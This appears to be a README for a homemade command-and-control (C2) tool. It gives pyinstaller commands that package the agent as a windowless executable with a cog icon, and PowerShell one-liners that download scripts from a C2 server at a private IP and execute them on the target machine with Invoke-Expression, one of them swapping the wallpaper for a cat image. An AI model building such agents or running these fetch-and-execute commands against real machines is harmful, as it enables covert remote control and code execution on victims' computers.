# C2
You should include 3 JSON files in /server directory: agents.json, commands_output.json, commands.json

## Agent
### Install EXE
```bash
pyinstaller --onefile --noconsole --icon=cog.ico agent.py
```

### Install EXE (with a different name)
```bash
pyinstaller --onefile --noconsole --icon=cog.ico --name=ExeName agent.py
```

## Custom powershell script usage:

To run custom powershell scripts on target machine (Agent), you can execute this command:
```powershell
Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/script.ps1").Content) )
```

Change wallpaper to cat image:
```powershell
Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/wallpaper.ps1").Content) )
```